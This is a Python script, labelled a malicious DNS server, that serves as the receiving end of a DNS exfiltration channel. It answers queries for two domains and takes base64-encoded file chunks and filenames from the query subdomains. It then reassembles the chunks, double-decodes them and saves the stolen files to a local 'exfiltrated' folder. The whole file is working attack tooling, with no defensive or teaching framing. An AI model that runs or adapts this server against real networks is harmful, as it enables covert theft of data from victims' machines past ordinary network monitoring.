"""
Malicious DNS server for DNS exfiltration
"""
import os
import base64
from dnslib import DNSRecord, QTYPE, RR, A, DNSHeader
import socket
import socketserver

# Get the local IP address
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

# DNS server configuration
DOMAIN_TO_IP = {
    'a.com.': local_ip,
    'b.com.': local_ip,
}

BIND_ADDR="0.0.0.0"
BIND_PORT=5353
full_data = ""
filename = ""
last_chunk = ""

class DNSHandler(socketserver.BaseRequestHandler):
    
    def handle(self):
        global full_data, filename, last_chunk
        data = self.request[0]
        client_socket = self.request[1]
        exfiltrated_chunk = ""
        try:
            request = DNSRecord.parse(data)
            fqdn_query = str(request.q.qname)
            if len(fqdn_query.split('.')) == 4:
                exfiltrated_chunk = fqdn_query.split(".", maxsplit=1)[0]
                if exfiltrated_chunk == last_chunk:
                    # With host binary, request is sent multiple times if not resolved.
                    #print("Duplicated chunk:", exfiltrated_chunk)
                    exfiltrated_chunk = ""
                else:
                    print("Received chunk:", exfiltrated_chunk)
            elif len(fqdn_query.split('.')) >= 5:
                filename = ".".join(fqdn_query.split('.')[:-3])
                print("Received filename:", filename)

            qname = ".".join(fqdn_query.split(".")[-3:])[:-1]
            # Create a DNS response with the same ID and the appropriate flags
            reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

            # Resolve DNS 
            if qname in DOMAIN_TO_IP:
                reply.add_answer(RR(qname, QTYPE.A, rdata=A(DOMAIN_TO_IP[qname])))

            client_socket.sendto(reply.pack(), self.client_address)

            if exfiltrated_chunk:
                if exfiltrated_chunk == "end":
                    self.save_exfiltrated_file()
                    full_data = ""
                    filename = ""
                else:
                    full_data += exfiltrated_chunk
                last_chunk = exfiltrated_chunk
        except Exception as e:
            print(f"Error handling request: {e}")


    def save_exfiltrated_file(self):
        global full_data, filename
        folder = "exfiltrated"
        if not os.path.exists(folder):
            os.makedirs(folder)
            print("folder created")

        print("saving file:", filename)
        full_path = folder + "/" + filename
        with open(full_path, "wb") as f:
            decoded_data = base64.b64decode(base64.b64decode(full_data)) # double decoding
            f.write(decoded_data)


if __name__ == "__main__":
    malicious_server = socketserver.UDPServer((BIND_ADDR, BIND_PORT), DNSHandler)
    print("DNS Server is running...")
    malicious_server.serve_forever()
